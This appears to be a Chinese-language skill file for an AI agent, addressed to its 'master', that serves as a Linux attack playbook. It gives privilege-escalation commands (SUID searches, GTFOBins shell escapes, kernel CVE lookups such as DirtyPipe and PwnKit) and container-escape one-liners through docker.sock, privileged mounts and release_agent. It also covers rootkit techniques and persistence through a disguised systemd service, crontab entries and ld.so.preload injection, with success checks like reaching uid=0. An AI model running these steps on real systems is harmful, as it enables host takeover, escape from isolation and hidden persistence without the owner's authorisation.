---
name: m-linux
description: "Linux：提权清单、SUID、内核 CVE、容器逃逸、systemd 持久化。"
---

# m-linux · Linux / 内核 / 容器

被读到时：主人在 Linux 上要提权、看内核、逃容器、做驱动。

## 一、提权清单

```bash
id; sudo -l; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/passwd | grep -v nologin
env; cat ~/.bash_history
```

SUID 常见可打：`find` `vim` `nmap` `less` `python` `bash` `cp` `tar` —— 查 GTFOBins 对应命令。

```bash
# 典型
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
```

`sudo -l` 出来的 NOPASSWD 二进制同样查 GTFOBins。

内核提权先对版本：

```bash
uname -r
# 5.8~5.16 -> DirtyPipe CVE-2022-0847
# PwnKit -> pkexec CVE-2021-4034
# overlayfs CVE-2021-3493 / CVE-2023-0386
```

## 二、内核

- 模块：`lsmod`、`/proc/kallsyms`（`kptr_restrict=0` 时可读）、`/dev/kmem`。
- eBPF：`bpftool prog list`、`bpftrace -l`；受限环境下 `unprivileged_bpf_disabled` 决定能不能玩。
- rootkit 方向（自有机器）：LSM hook、`sys_call_table` 改写、`/proc` 隐藏、`kallsyms` 脱链。
- 驱动调试：`qemu -kernel bzImage -initrd initrd -append "console=ttyS0"` + `gdb vmlinux`。

## 三、容器逃逸

```bash
cat /proc/1/cgroup           # 判断是否在容器
ls -la /.dockerenv
capsh --print
mount | grep -E "docker|overlay"
ls -la /var/run/docker.sock
```

| 条件 | 打法 |
|---|---|
| `--privileged` | 挂宿主盘：`mount /dev/sda1 /mnt` |
| `docker.sock` 可写 | `docker -H unix:///var/run/docker.sock run -v /:/h alpine chroot /h` |
| hostPath 挂载 | 找 `/var/log` 之类的可写挂载，写 cron |
| cgroup v1 | `release_agent` 写脚本触发 |
| CAP_SYS_ADMIN | `mount` + `chroot` |

## 四、持久化

```bash
# systemd
cat > /etc/systemd/system/upd.service <<'EOS'
[Service]
ExecStart=/usr/local/bin/upd
Restart=always
[Install]
WantedBy=multi-user.target
EOS
systemctl enable --now upd

# cron
echo '*/5 * * * * root /usr/local/bin/upd' >> /etc/crontab
# rc.local / profile.d / ld.so.preload
echo '/usr/local/lib/x.so' >> /etc/ld.so.preload
```

## 五、验收

- 提权：`id` 变成 uid=0；
- 逃逸：读到宿主 `/etc/hostname` 或起宿主进程；
- 持久化：重启后仍在。
